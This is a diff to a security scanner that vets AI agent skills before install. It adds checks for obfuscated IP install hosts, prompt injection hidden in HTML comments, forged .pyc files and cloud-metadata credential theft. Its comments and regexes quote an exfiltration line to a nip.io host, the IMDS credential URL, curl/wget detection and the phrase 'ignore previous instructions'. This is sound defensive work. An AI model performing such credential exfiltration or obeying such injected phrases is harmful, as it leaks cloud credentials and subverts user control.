@@ -65,7 +65,9 @@ from ._shared import (
     _enabled_tools,
     _finding,
     _hint,
-    _is_public_ip,
+    _ip_reaches_nonlocal_host,
+    _ipv4_class,
+    _NUMERIC_IP_HOST_PATTERN,
     _mcp_servers,
     _mcp_tool_texts,
     _skill_frontmatter_block,
@@ -4133,7 +4135,7 @@ def _clickfix_public_ip_fetch(cmd: str) -> bool:
     command's URL targets a bare, PUBLIC IPv4/IPv6 literal host - not a domain name.
     Reuses `_install_host_is_public_ip` (B103's already-vetted public-vs-private/
     loopback/link-local/TEST-NET classifier - IPv4 via pure integer-octet math in
-    `_is_public_ip`, IPv6 via stdlib `ipaddress` single-address properties, both stable
+    `_ip_reaches_nonlocal_host`, IPv6 via stdlib `ipaddress` single-address properties, both stable
     across Python 3.9-3.12) instead of a new private-IP table. A legitimate, documented
     installer command publishes a stable domain name, never a raw IP - vendors need a
     domain for TLS identity and because IPs churn - so a public-IP-literal fetch host
@@ -4357,7 +4359,11 @@ _INSTALL_HEADING_RE = re.compile(
 )
 
 
-_INSTALL_IPV4_HOST_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
+# B-1039: any numeric-IP-shaped host (hex / leading-zero / fewer-than-four-part / single integer
+# included) goes to `_ipv4_class`, which calls every non-dotted-quad form "ambiguous" (off-host,
+# never local) - so `https://0x08080808/` and `https://2130706433/` no longer slip past B103's
+# raw-IP FAIL. Matched against a parsed hostname only (no path/port/userinfo), whole string.
+_INSTALL_IPV4_HOST_RE = re.compile(r"^" + _NUMERIC_IP_HOST_PATTERN + r"\Z")
 
 
 # ---------- B103: install-directive supply-chain (B-099) ----------
@@ -5168,6 +5174,138 @@ def _b58_pattern_hit_count(pat: re.Pattern, s: str) -> int:
     variant actually REVEALED a new occurrence vs. merely changed unrelated bytes
     elsewhere in the document (B58 decode-variant loop, below)."""
     return sum(1 for _ in pat.finditer(s))
+
+
+def _b58_comment_spans(text: str) -> list:
+    """B-1019: (start, end) of every HTML comment, in one linear pass - the same comments
+    `_B58_HTML_COMMENT_RE` (`<!--(.*?)-->`) finds, plus an unterminated `<!--` running to
+    the end of the text. Not the regex itself: on many unterminated `<!--` it rescans to
+    the end from each one (quadratic)."""
+    spans = []
+    pos = text.find("<!--")
+    while pos != -1:
+        end = text.find("-->", pos + 4)
+        if end == -1:
+            spans.append((pos, len(text)))
+            break
+        spans.append((pos, end + 3))
+        pos = text.find("<!--", end + 3)
+    return spans
+
+
+def _b58_visible_text(text: str) -> str:
+    """B-1019: `text` with every hidden region blanked - each HTML comment (an
+    unterminated `<!--` runs to the end, as a renderer hides it) and each hidden-styled
+    tag `_b58_hidden_segments` reads. Used to tell whether an injection hit on a
+    whole-document variant actually sits INSIDE a hidden region, rather than in plain text
+    while an unrelated comment elsewhere supplies the html-comment signal.
+
+    A blanked region starts with a `|` sentinel, not a space: INJECTION_PATTERNS join
+    words with a literal space and normalization collapses whitespace, so all-space
+    blanking would glue `ignore <!--x--> previous instructions` into a NEW visible match
+    and hide a real hidden hit behind an equal count. Newlines are kept, so the result
+    has the same length and line structure as `text`."""
+    chars = list(text)
+
+    def _blank(a: int, b: int) -> None:
+        for i in range(a, b):
+            if chars[i] != "\n":
+                chars[i] = " "
+        if a < b and chars[a] != "\n":
+            chars[a] = "|"
+
+    for a, b in _b58_comment_spans(text):
+        _blank(a, b)
+    if _B58_HIDDEN_STYLE_RE.search(text):
+        for m in _b58_hidden_tags(text):
+            if _B58_HIDDEN_STYLE_RE.search(m.group("attrs") or ""):
+                _blank(*m.span())
+    return "".join(chars)
+
+
+# B-1019: every element name in the WHATWG HTML standard (plus obsolete ones browsers
+# still honour, and the svg/math roots that open foreign content). A closed list: a bare
+# `<name>` whose name is NOT here is an unknown element, which renders its content inline
+# and visible and can only be hidden by CSS - and CSS needs a `<style>` or `<link>`
+# element, which IS here.
+_B58_HTML_ELEMENTS = frozenset("""
+a abbr acronym address applet area article aside audio b base basefont bdi bdo bgsound
+big blink blockquote body br button canvas caption center cite code col colgroup data
+datalist dd del details dfn dialog dir div dl dt em embed fieldset figcaption figure
+font footer form frame frameset h1 h2 h3 h4 h5 h6 head header hgroup hr html i iframe
+image img input ins isindex kbd keygen label legend li link listing main map mark
+marquee math menu menuitem meta meter multicol nav nextid nobr noembed noframes
+noscript object ol optgroup option output p param picture plaintext portal pre progress
+q rb rp rt rtc ruby s samp script search section select slot small source spacer span
+strike strong style sub summary sup svg table tbody td template textarea tfoot th thead
+time title tr track tt u ul var video wbr xmp
+""".split())
+_B58_TAG_NAME_RE = re.compile(r"/?([A-Za-z][A-Za-z0-9:_-]*)")
+# B-1019: the Markdown constructs whose text a renderer does not display, besides HTML
+# (CommonMark's complete set): a link reference definition (any destination - unused, it
+# renders nothing), an image (its description is alt text), and a link/image title
+# (a tooltip). Any of them in a file keeps the pre-B-1019 rule there.
+# Matched ANYWHERE, with no Markdown parsing: `]:` (a link reference definition, which
+# may sit in a block quote or list item or carry an escaped or multi-line label), `![`
+# (an image) and `](` (an inline link, which may carry a title). Parsing link
+# destinations and titles to tell the harmless ones apart went through several bypass
+# rounds (balanced/escaped parens, titles on the next line, container prefixes), so any
+# occurrence keeps the old rule. Over-approximates on purpose.
+_B58_MD_HIDDEN_TEXT_RE = re.compile(r"\]:|!\[|\]\(")
+
+
+
+def _b58_section_needs_old_rule(section: str) -> bool:
+    """B-1019 fail-closed, judged per file: True unless the file's only markup is HTML
+    comments and bare unknown-name placeholders (`<slug>`, `<key>: <value>`). The location
+    rule's visible-text model knows comments and inline hidden-styled tags, but HTML can
+    hide text in many more ways, so rather than list those, ANY real HTML element name,
+    any tag with attributes, any unterminated tag, any `<!`/`<?` markup outside a comment
+    and any Markdown text a renderer does not display (`_B58_MD_HIDDEN_TEXT_RE`: link
+    reference definitions, images, link titles) keeps the pre-B-1019 rule for that file.
+    No Markdown parsing (code spans, fences) is involved: a tag inside one still counts."""
+    chars = list(section)
+    for a, b in _b58_comment_spans(section):
+        for i in range(a, b):
+            if chars[i] != "\n":
+                chars[i] = " "
+    rest = "".join(chars)
+    if _B58_MD_HIDDEN_TEXT_RE.search(rest):
+        return True
+    pos = rest.find("<")
+    while pos != -1:
+        nxt = rest[pos + 1:pos + 2]
+        if nxt in ("!", "?"):
+            return True
+        m = _B58_TAG_NAME_RE.match(rest, pos + 1)
+        if m:
+            if m.group(1).lower() in _B58_HTML_ELEMENTS:
+                return True
+            close = rest.find(">", m.end())
+            other = rest.find("<", m.end())
+            if close == -1 or (other != -1 and other < close):
+                return True  # unterminated: fail closed
+            if rest[m.end():close].strip(" \t/"):
+                return True  # attributes on an unknown element
+        pos = rest.find("<", pos + 1)
+    return False
+
+
+_B58_FILE_HEADER_LINE_RE = re.compile(r"^# file:", re.MULTILINE)
+
+
+def _b58_unresolved_hit(pat: re.Pattern, variant: str) -> bool:
+    """B-1019 fail-closed, per file: True when some "# file:" section of `variant` both
+    contains a `pat` hit and is not plain text/Markdown (`_b58_section_needs_old_rule`). The section headers are the collector's own,
+    un-forgeable ones (a file's own header-shaped line is escaped before concatenation);
+    a bootstrap file has none and is one section."""
+    starts = [m.start() for m in _B58_FILE_HEADER_LINE_RE.finditer(variant)]
+    bounds = [0, *starts, len(variant)]
+    for a, b in zip(bounds, bounds[1:]):
+        section = variant[a:b]
+        if section and pat.search(section) and _b58_section_needs_old_rule(section):
+            return True
+    return False
 
 
 def _b58_extract_actionable(seg_norm: str) -> bool:
@@ -6515,6 +6653,14 @@ def _check_unicode_obfuscation(ctx: Context) -> Finding:
                 "from byte-level pattern matching \u2014 cannot be verified safe"
             )
             hidden = True
+        _visible: list = []
+
+        def visible_hits(p: re.Pattern) -> int:
+            # Hits of `p` in the visible part of the raw text (hidden regions blanked).
+            if not _visible:
+                _visible.append(normalize_for_scan(_b58_visible_text(text)))
+            return _b58_pattern_hit_count(p, _visible[0])
+
         for variant, signals, is_extract in ([] if hidden else variants):
             if not signals:
                 continue
@@ -6547,6 +6693,25 @@ def _check_unicode_obfuscation(ctx: Context) -> Finding:
                         and (
                             (not base_defensive and not catalogue_defensive)
                             or _b58_extract_actionable(variant)
+                        )
+                        # B-1019: on a whole-document variant the hidden-channel label
+                        # comes from ANY comment/hidden tag in the text, so it convicts
+                        # only when a hit of this pattern sits inside a hidden region:
+                        # more hits in the whole text than in its visible part. A
+                        # plaintext quote beside an unrelated comment no longer FAILs; a
+                        # hidden payload plus a plaintext decoy copy still does (count).
+                        # Judged on `norm` for every whole-document variant: a decode
+                        # that REVEALED a new hit is already convicted by the first
+                        # disjunct, so any other decode's hits are norm's own - and only
+                        # norm's "# file:" headers are un-forgeable (a decode could mint
+                        # one). A file that is not plain text/Markdown keeps the old rule
+                        # (`_b58_unresolved_hit`). Segment extracts and base64 decodes
+                        # keep the old rule.
+                        and (
+                            is_extract
+                            or "base64:" in signals
+                            or _b58_unresolved_hit(pat, norm)
+                            or _b58_pattern_hit_count(pat, norm) > visible_hits(pat)
                         )
                     )
                 ):
@@ -7715,27 +7880,59 @@ def _install_host_is_public_ip(host: str) -> bool:
     TEST-NET literal - an install directive that fetches from `127.0.0.1`, `192.168.x.x` or
     `[::1]` is an air-gapped / homelab / fleet-internal mirror on the operator's own network,
     not an anonymous swappable supply-chain source, so it must NOT FAIL. IPv4 goes through
-    `_is_public_ip` (explicit TEST-NET/private handling, stable across Python versions); IPv6
+    `_ip_reaches_nonlocal_host` (explicit CIDR tables, stable across Python versions; B-1017:
+    RFC 6598 shared space / multicast / reserved still count as "not local"); IPv6
     is classified via stdlib `ipaddress`."""
     if not host:
         return False
     h = host.strip().strip("[]")
     if _INSTALL_IPV4_HOST_RE.match(h):
-        return _is_public_ip(h)
+        return _ip_reaches_nonlocal_host(h)
     if ":" in h:  # IPv6 literal (urlparse strips the [] but be defensive)
-        try:
-            ip = ipaddress.ip_address(h)
-        except ValueError:
-            return False
-        return not (
-            ip.is_loopback
-            or ip.is_private
-            or ip.is_link_local
-            or ip.is_reserved
-            or ip.is_unspecified
-            or ip.is_multicast
-        )
+        local = _ipv6_literal_is_local(h)
+        # fail closed: an unparseable literal is not "public", but every parseable one that
+        # is not affirmatively local (global, reserved, multicast, Teredo) reaches off-host
+        return False if local is None else not local
     return False
+
+
+_IPV6_LOCAL_NETS = (
+    ipaddress.ip_network("fe80::/10"),  # link-local
+    ipaddress.ip_network("fc00::/7"),  # unique local (ULA)
+)
+
+
+def _ipv6_embedded_ipv4(ip: "ipaddress.IPv6Address"):
+    """The IPv4 address an IPv6 literal carries, or None. Explicit bit arithmetic (no
+    `is_private` / `is_global` / `ipv4_mapped`, whose answers differ across Python 3.10-3.14):
+    IPv4-mapped `::ffff:a.b.c.d`, IPv4-translated `::ffff:0:a.b.c.d`, 6to4 `2002:AABB:CCDD::/48`
+    and IPv4-compatible `::a.b.c.d` (`::` and `::1` are NOT compatible forms). Teredo
+    (2001::/32) is deliberately not unwrapped: it is never local, so the caller treats it as
+    off-host without having to decode the obfuscated client address."""
+    n = int(ip)
+    if n >> 32 in (0xFFFF, 0xFFFF0000) or (n >> 32 == 0 and n > 1):
+        return ipaddress.IPv4Address(n & 0xFFFFFFFF)
+    if n >> 112 == 0x2002:
+        return ipaddress.IPv4Address((n >> 80) & 0xFFFFFFFF)
+    return None
+
+
+def _ipv6_literal_is_local(h: str):
+    """True / False for an IPv6 literal (local = loopback `::1`, unspecified `::`, link-local,
+    ULA, or an embedded IPv4 that `_ipv4_class` calls local/documentation); None when *h* does
+    not parse. Reserved, multicast and global space are NOT local (fail closed), and an
+    embedded PUBLIC IPv4 (`::ffff:8.8.8.8`, `::8.8.8.8`, `2002:808:808::1`) is not local either."""
+    try:
+        ip = ipaddress.ip_address(h)
+    except ValueError:
+        return None
+    if ip.version != 6:  # defensive: a v4 string never reaches here via the ":" gate
+        return None
+    v4 = _ipv6_embedded_ipv4(ip)
+    if v4 is not None:
+        return _ipv4_class(str(v4)) in ("local", "documentation")
+    n = int(ip)
+    return n in (0, 1) or any(ip in net for net in _IPV6_LOCAL_NETS)
 
 
 def _install_host_is_local(host: str) -> bool:
@@ -7752,9 +7949,13 @@ def _install_host_is_local(host: str) -> bool:
         (".local", ".localhost", ".internal", ".lan", ".home.arpa")
     ):
         return True
-    # An IP literal that is NOT a public IP is loopback/private/link-local/ULA/TEST-NET.
-    if (_INSTALL_IPV4_HOST_RE.match(h) or ":" in h):
-        return not _install_host_is_public_ip(h)
+    # B-1039: POSITIVE-only. `not _install_host_is_public_ip(h)` also called a numeric host
+    # that failed to classify (and an unparseable IPv6 string) "local", clearing the
+    # plaintext-transport FAIL - local must be affirmed, never inferred from "not public".
+    if _INSTALL_IPV4_HOST_RE.match(h):
+        return _ipv4_class(h) in ("local", "documentation")
+    if ":" in h:  # IPv6 literal: positive-only, see `_ipv6_literal_is_local`
+        return _ipv6_literal_is_local(h) is True
     return False
 
 
@@ -11456,6 +11657,12 @@ def check_unchecked_hash_pyc(ctx: Context) -> Finding:
 
     A ``.pyc`` with no sibling source is NOT flagged here: that was considered and left
     out, because stale caches of removed modules are common on real installs.
+
+    B-1003: two sibling routes cannot be convicted by header alone - a forged TIMESTAMP pyc
+    whose recorded mtime+size match the shipped ``.py``, and a checked-hash pyc run under
+    ``python3 --check-hash-based-pycs never``. A matching stored source hash is not evidence
+    of benignity, so on the pre-install path ONLY (``ctx.pre_install``; an installed skill
+    legitimately carries runtime pycs) ANY other loadable ``.pyc`` is a WARN disclosure.
     """
     skills = getattr(ctx, "installed_skills", None)
     found = getattr(ctx, "skill_unchecked_pycs", {})
@@ -11481,6 +11688,30 @@ def check_unchecked_hash_pyc(ctx: Context) -> Finding:
             + (" Part of the skill could not be inspected for .pyc files either: "
                + "; ".join(gap_ev[:3]) + "." if gap_ev else ""),
             ev + [f"not inspected: {g}" for g in gap_ev],
+        )
+    compiled = getattr(ctx, "skill_compiled_pycs", {})
+    if compiled and getattr(ctx, "pre_install", False):
+        # B-1003: pre-install only. A timestamp pyc forged to match the shipped .py (survives
+        # mtime-preserving tar/unzip) or a checked-hash pyc run under
+        # `--check-hash-based-pycs never` is imported instead of the source, and a header
+        # that matches the source proves nothing - so disclose, never FAIL on this alone.
+        cev = [f"{Path(k).name}: {rel}" for k, rels in sorted(compiled.items()) for rel in rels]
+        cextra = f" (+{len(cev) - 6} more)" if len(cev) > 6 else ""
+        return _custom(
+            "B398",
+            MEDIUM,
+            WARN,
+            "This skill ships compiled Python (.pyc): " + "; ".join(cev[:6]) + cextra
+            + ". Python may run it instead of the .py source you reviewed.",
+            "Reinstall without __pycache__, or delete the .pyc files, before trusting this "
+            "review. A .pyc whose header matches its .py is not evidence it is benign: a "
+            "timestamp-based one can be forged to match, and a hash-checked one is skipped "
+            "by `python3 --check-hash-based-pycs never`. A legitimate author may ship them "
+            "by accident, so this alone is a warning, not a conviction."
+            + (" Part of the skill could not be inspected for .pyc files either: "
+               + "; ".join(f"{Path(k).name}: {g}" for k, gl in sorted(gaps.items()) for g in gl)[:300]
+               + "." if gaps else ""),
+            cev,
         )
     if gaps:
         return _custom(
@@ -13955,6 +14186,25 @@ _B339_CRED_URL_RE = re.compile(
     re.IGNORECASE,
 )
 
+# B-1011: the BARE AWS/Alibaba `security-credentials/` listing -- the URL
+# real IMDS-theft code actually writes down. The listing returns only the role name,
+# so the minting URL is assembled at runtime (`LISTING + role`) and never appears
+# literally; `_B339_CRED_URL_RE` above (deliberately, C-135 round 1) never matches it,
+# so the `@ifasn/*-doc-mcp` family (GHSA-rvw8-22w3-342v and siblings) produced no
+# B339 at all. The listing is still NOT a finding on its own -- it is ordinary role
+# detection, exactly the clean fixture's shape. It counts only when either (a) the same
+# code builds a follow-up URL from it (WARN, `_b339_listing_followup`), or (b) the
+# fetched metadata response visibly leaves the host through an outbound call
+# (FAIL, network legs only -- see `_b339_corroborated(network_only=True)`). The
+# terminator lookahead keeps it disjoint from `_B339_CRED_URL_RE`: a role segment
+# (`/MyRole`, `/$ROLE`, `/{role}`) after the slash is the existing regex's match.
+_B339_LISTING_URL_RE = re.compile(
+    r"(?:169\.254\.169\.254[^\s\"'`]*?/latest/meta-data/iam"
+    r"|100\.100\.100\.200[^\s\"'`]*?/latest/meta-data/ram)"
+    r"/security-credentials/(?=[\"'`\s)\]]|$)",
+    re.IGNORECASE,
+)
+
 
 # B-398 round 2 (independent C-135 review found round 1's design unsound -- see
 # below): what happens to the token AFTER the fetch, not the fetch itself, is the
@@ -13999,8 +14249,9 @@ _B339_ASSIGN_LOOKBACK = 120
 # the corroborator searched for the wrong variable and silently missed a real exfil).
 # A statement-level assignment starts a line (or follows `;`); a kwarg is preceded by
 # `(` or `, ` inside a call's argument list -- this excludes the latter.
+_B339_DECL_KW = r"(?:(?:export[^\S\n]+)?(?:const|let|var|local|readonly|declare)[^\S\n]+)?"
 _B339_VAR_ASSIGN_RE = re.compile(
-    rf"(?:^|[\n;])[^\S\n]*({_B339_VAR_NAME_RE})\s*=\s*\$?\(?", re.MULTILINE
+    rf"(?:^|[\n;])[^\S\n]*{_B339_DECL_KW}({_B339_VAR_NAME_RE})\s*=\s*\$?\(?", re.MULTILINE
 )
 
 _B339_CORROBORATOR_WINDOW = 300  # chars AFTER the credential-URL match to look for misuse
@@ -14268,7 +14519,480 @@ def _b339_credential_persisted(window: str, varname: str) -> bool:
     return False
 
 
-def _b339_corroborated(norm: str, match_start: int, match_end: int, own_host) -> str | None:
+# ---------- B339 / B-1011: the URL-query exfil leg ----------------------
+#
+# `_b339_credential_as_payload` models the metadata response leaving as a call's BODY
+# (`json=`/`data=`/`-d`). The `@ifasn/*-doc-mcp` family sends it in the request URL
+# instead -- `get("http://<ip>.nip.io/?stage=report&nodes=" + encodeURIComponent(out))`
+# -- which that leg never saw, so even a literal-role fetch stayed WARN. This leg asks
+# the same data-flow question of the URL: does the fetched value (or a name derived from
+# it inside a short, bounded window) end up inside an outbound call's URL string -- by
+# `+` concatenation, a JS template `${...}`, a Python f-string/`%`/`.format`, a shell
+# `$VAR` inside the URL word, or a `params=` argument?
+#
+# Why the URL and not the header is the discriminator: the keyless-auth flows B-398
+# protects put the token in an `Authorization` HEADER -- a header value is never an
+# `http(s)://` literal, so none of the shapes below can fire on it. A destination that
+# is itself a metadata host (`LISTING + role`, the follow-up fetch), loopback, or the
+# skill's own declared host is not an off-host leak and never corroborates.
+#
+# The destination's SHAPE (a bare IP, a wildcard-DNS alias like nip.io) is deliberately
+# NOT consulted: it is not needed for the conviction (the data flow is), and making it a
+# requirement would only teach an attacker to use an ordinary domain.
+#
+# Taint propagation is one forward pass over at most `_B339_QUERY_WINDOW` characters,
+# statement by statement (split on newline/`;`): a loop variable iterating a tainted
+# name, an assignment whose right side mentions one, or a `.push/.append/.extend/.add`
+# whose argument does, taints the new name; an assignment whose right side does not
+# un-taints it. That is intentionally the smallest set that follows the advisory's own
+# shape (URL array -> loop -> push(fetch(u)) -> join -> query) without becoming general
+# data-flow analysis.
+_B339_QUERY_WINDOW = 600
+_B339_BRACKET_LOOKBACK = 1500
+_B339_STMT_SPLIT_RE = re.compile(r"[\n;]")
+_B339_LOOP_VAR_RE = re.compile(
+    rf"\bfor\b[^\S\n]*\(?[^\S\n]*(?:const|let|var)?[^\S\n]*({_B339_VAR_NAME_RE})[^\S\n]+(?:of|in)\b"
+)
+_B339_STMT_ASSIGN_RE = re.compile(
+    rf"^[^\S\n]*{_B339_DECL_KW}({_B339_VAR_NAME_RE})[^\S\n]*(?:\+=|=(?!=))"
+)
+_B339_COLLECT_RE = re.compile(rf"\b({_B339_VAR_NAME_RE})\.(?:push|append|extend|add)\s*\(")
+# Outbound calls whose FIRST argument is a URL -- GET-capable, unlike
+# `_B339_OUTBOUND_CALL_RE`, which only needs body-carrying verbs.
+_B339_URL_CALL_RE = re.compile(
+    r"\bhttps?\.(?:get|request)\s*\(|\bfetch\s*\(|\baxios(?:\.(?:get|post|put|request))?\s*\(|"
+    r"\b(?:requests|httpx|session)\.(?:get|post|put|patch|head|request)\s*\(|\burlopen\s*\(|"
+    r"\bRequest\s*\(|\bgot(?:\.(?:get|post))?\s*\(|\bcurl\b|\bwget\b|"
+    r"\bInvoke-(?:WebRequest|RestMethod)\b",
+    re.I,
+)
+_B339_URL_CALL_ARGS_WINDOW = 240
+_B339_METADATA_OR_LOCAL_HOST_RE = re.compile(
+    r"^(?:169\.254\.\d{1,3}\.\d{1,3}|100\.100\.100\.200|metadata\.google\.internal|metadata|"
+    r"127\.\d{1,3}\.\d{1,3}\.\d{1,3}|localhost|0\.0\.0\.0|\[?::1\]?|\[?fd00:ec2::254\]?)$",
+    re.I,
+)
+
+
+def _b339_url_shapes(names: "set[str]") -> "list[re.Pattern]":
+    """Patterns for a URL string that carries one of *names*; group 1 is the URL text
+    up to the tainted reference (for the host), or a `$VAR` to resolve for shell."""
+    if not names:
+        return []
+    alt = "|".join(re.escape(n) for n in sorted(names))
+    return [
+        # "http://h/?q=" + x   /   "http://h/" + encode(x.join("|"))
+        re.compile(rf"([\"'])(https?://[^\"'\s]*)\1\s*\+\s*[^;\n,)]{{0,120}}?\b(?:{alt})\b"),
+        # "http://h/?q=%s" % x   /   "http://h/?q={{}}".format(x)
+        re.compile(
+            rf"([\"'])(https?://[^\"'\s]*)\1\s*(?:%\s*\(?|\.format\s*\()[^;\n)]{{0,120}}?\b(?:{alt})\b"
+        ),
+        # `http://h/?q=${x}`   /   f"http://h/?q={x}"
+        re.compile(rf"(`)(https?://[^`\s]*?)\$\{{[^}}`]*\b(?:{alt})\b"),
+        re.compile(rf"\b[fF][rR]?([\"'])(https?://[^\"'\n]*?)\{{[^}}\"'\n]*\b(?:{alt})\b"),
+        # shell: http://h/?q=$X  /  ${X}  inside the same URL word
+        re.compile(rf"()(https?://[^\s\"'`]*?)\$\{{?(?:{alt})\b"),
+        # shell, host from a variable: "$HOST/?q=$X"
+        re.compile(rf"()(\$\{{?{_B339_VAR_NAME_RE}\}}?[^\s\"'`$]*)\$\{{?(?:{alt})\b"),
+    ]
+
+
+def _b339_query_seed(norm: str, match_start: int) -> "str | None":
+    """The name to start tainting from: the statement's assignment target
+    (`_b339_response_variable`), else the collection an inline fetch is pushed into
+    (`out.push(await fetch("<url>"))`), else the variable whose still-open bracket
+    literal holds the URL (`const NODES = [\n "<url1>",\n "<url2>" ...`)."""
+    v = _b339_response_variable(norm, match_start)
+    if v is not None:
+        return v
+    stmt_start = max(norm.rfind("\n", 0, match_start), norm.rfind(";", 0, match_start)) + 1
+    cm = _B339_COLLECT_RE.search(norm, stmt_start, match_start)
+    if cm is not None:
+        return cm.group(1)
+    lookback = norm[max(0, match_start - _B339_BRACKET_LOOKBACK) : match_start]
+    best = None
+    for m in re.finditer(
+        rf"(?:^|[\n;])[^\S\n]*{_B339_DECL_KW}({_B339_VAR_NAME_RE})\s*=\s*[\[(]", lookback, re.M
+    ):
+        tail = lookback[m.end() :]
+        depth = 1 + tail.count("[") + tail.count("(") - tail.count("]") - tail.count(")")
+        if depth > 0:
+            best = m
+    return best.group(1) if best is not None else None
+
+
+# Fail-closed: the seed holds the metadata URL itself only when everything between
+# its binding and the URL is a pure literal -- an optional opening bracket, earlier
+# string elements, separators and the URL's own opening quote/scheme
+# (`NODES = ["<a>", "<b>"`, `LIST = "<url>"`, `urls.push("<url>"`, a bash array).
+# Anything else (a call in any spelling: `get(`, `)(`, `?.(`, `$(`, a backtick) keeps
+# the seed a fetched response, so an unusual call shape can never downgrade it.
+_B339_PURE_LITERAL_PREFIX_RE = re.compile(
+    r"\s*(?:[\[(]\s*)?(?:(?P<q>[\"'])[^\"'`\n]*(?P=q)\s*(?:,\s*)?)*[\"']?(?:https?://)?\Z"
+)
+
+
+def _b339_seed_holds_url(norm: str, match_start: int, seed: str) -> bool:
+    """True when *seed* is bound to the metadata URL itself, not to a fetch result.
+    C-135 round 1 on B-1011: `for u in [LISTING]: get("https://x/?probe=" + u)` sends
+    the URL, not a metadata response, and used to FAIL."""
+    lookback = norm[max(0, match_start - _B339_BRACKET_LOOKBACK) : match_start]
+    bind = None
+    for m in re.finditer(rf"\b{re.escape(seed)}\s*(?:=(?!=)|\.(?:push|append|extend|add)\s*\()", lookback):
+        bind = m
+    if bind is None:
+        return False
+    return _B339_PURE_LITERAL_PREFIX_RE.match(lookback, bind.end()) is not None
+
+
+def _b339_offhost_url(norm: str, pos: int, url_text: str, own_host) -> "str | None":
+    """*url_text* (a literal `http(s)://...` prefix or a `$HOST...` shell prefix) as a
+    URL when it points off-host -- not a metadata/loopback address and not the skill's
+    own host; None otherwise, including when a `$HOST` cannot be resolved (an
+    unresolvable shell destination is not proof of an external one)."""
+    if url_text.startswith("$"):
+        vm = _B339_SHELL_VAR_REF_RE.match(url_text)
+        resolved = _b339_resolve_shell_var(norm, pos, vm.group(1)) if vm else None
+        if resolved is None or not resolved.lower().startswith(("http://", "https://")):
+            return None
+        url_text = resolved
+    hm = _URL_HOST_RE.match(url_text)
+    if hm is None:
+        return None
+    host = hm.group(1)
+    if _B339_METADATA_OR_LOCAL_HOST_RE.match(host) or _url_matches_own_host(url_text, own_host):
+        return None
+    return url_text
+
+
+def _b339_names_re(names: "set[str]") -> "re.Pattern":
+    return re.compile(rf"\b(?:{'|'.join(re.escape(n) for n in sorted(names))})\b")
+
+
+_B339_PARAMS_KW_RE = re.compile(r"\bparams\s*=\s*")
+
+
+def _b339_params_arg(seg: str, start: int) -> str:
+    """The text of the single `params=` argument beginning at *start*: a balanced
+    bracket literal, else a bare expression up to the next `,`/`)`. Bounded so a later
+    `headers=...` argument in the same call is never read as part of it (C-135 round 1
+    on B-1011: `params={"page": 1}, headers={"A": token}` used to FAIL).
+
+    Ends at the first `,`/`)` at bracket depth 0, so a bare call such as
+    `params=dict(a=1, t=tok)` keeps its own commas. Quoted strings are skipped while
+    counting, so a bracket or comma inside a string literal cannot end the argument
+    early. When the end is never found (truncated segment, unbalanced text), the rest
+    of the segment is returned -- reading too much here can only cost a WARN->FAIL on
+    a real tainted name, never hide one."""
+    return seg[start : _b339_arg_end(seg, start, stop_at_comma=True)]
+
+
+def _b339_arg_end(text: str, start: int, stop_at_comma: bool) -> int:
+    """Index where the argument (or, with *stop_at_comma* False, the whole argument
+    list) that begins at *start* ends: the first unmatched closing bracket, or a
+    depth-0 comma. String literals -- `"`, `'`, backtick and Python triple quotes --
+    are skipped, so brackets and commas inside them never count. Returns `len(text)`
+    when no end is found."""
+    depth = 0
+    quote = ""
+    k = start
+    n = len(text)
+    while k < n:
+        ch = text[k]
+        if quote:
+            if ch == "\\":
+                k += 2
+                continue
+            if text.startswith(quote, k):
+                k += len(quote)
+                quote = ""
+                continue
+        elif ch in "\"'`":
+            quote = ch * 3 if ch != "`" and text.startswith(ch * 3, k) else ch
+            k += len(quote)
+            continue
+        elif ch in "{([":
+            depth += 1
+        elif ch in "})]":
+            if depth == 0:
+                return k
+            depth -= 1
+        elif ch == "," and depth == 0 and stop_at_comma:
+            return k
+        k += 1
+    return n
+
+
+def _b339_in_network_call(text: str, names: "set[str]") -> bool:
+    """True when one of *names* sits anywhere inside the arguments of an outbound call
+    in *text* -- positional, keyword (`url=u`), interpolated (`` `${u}` ``, `f"{u}"`),
+    or after a command form (`curl $u`, `Invoke-RestMethod -Uri $u`)."""
+    if not names:
+        return False
+    names_re = _b339_names_re(names)
+    for call_m in _B339_URL_CALL_RE.finditer(text):
+        if call_m.group(0).endswith("("):
+            args = text[call_m.end() : _b339_arg_end(text, call_m.end(), stop_at_comma=False)]
+        else:
+            nl = text.find("\n", call_m.end())
+            args = text[call_m.end() : nl if nl != -1 else len(text)]
+        if names_re.search(args):
+            return True
+    return False
+
+
+# Callees known to only RESHAPE a string (encode, measure, parse, log), never fetch
+# it. C-135 round 2 on B-1011: `encodeURIComponent(u)`, `str(u)`, `len(u)`,
+# `new URL(u).host`, `urlparse(u).netloc`, `sanitize(u)` turned the URL STRING into a
+# "response" and FAILed code that only reports which endpoint it probes. Fail-closed
+# everywhere else: any other callee -- including computed ones (`)(u)`, `x[k](u)`,
+# `f?.(u)`) -- counts as a fetch, so an unfamiliar wrapper can never hide one.
+_B339_PURE_CALLEE_RE = re.compile(
+    r"(?:encodeURIComponent|encodeURI|decodeURIComponent|decodeURI|escape|unescape|quote|"
+    r"quote_plus|unquote|urlencode|str|String|repr|len|int|float|bool|print|log|info|debug|"
+    r"warn|warning|error|URL|urlparse|urlsplit|sanitize|normalize|trim|strip|lower|upper|"
+    r"toString|toLowerCase|toUpperCase|stringify|dumps|format|join|split|replace|basename|"
+    r"dirname)\Z"
+)
+
+
+def _b339_fetches(text: str, url_names: "set[str]") -> bool:
+    """True when *text* passes a URL-holding name to a call or a command -- the step
+    that turns a metadata URL into a metadata response: a known outbound call with the
+    name ANYWHERE in its arguments, a `curl`/`wget`/`iwr`/`irm` command naming it, or
+    any other call with the name as its first argument unless the callee is a known
+    pure string function (`_B339_PURE_CALLEE_RE`)."""
+    if not url_names:
+        return False
+    alt = "|".join(re.escape(n) for n in sorted(url_names))
+    if _b339_in_network_call(text, url_names):
+        return True
+    if re.search(rf"\b(?:curl|wget|iwr|irm)\b[^\n;]*\$\{{?(?:{alt})\b", text):
+        return True
+    for m in re.finditer(
+        rf"(?:(?<![\w$])([A-Za-z_$][\w$]*)|[\])])\s*(?:\?\.)?\s*\(\s*(?:await\s+)?(?:{alt})\b", text
+    ):
+        if m.group(1) is None or not _B339_PURE_CALLEE_RE.match(m.group(1)):
+            return True
+    return False
+
+
+# Deliberately NO status exemption of any kind. A health check that reports only a
+# status/boolean (`get(u).status_code`, `r.ok`, `curl -o /dev/null -w "%{http_code}"`)
+# reads statically like the response leaving the host, and every discriminator tried
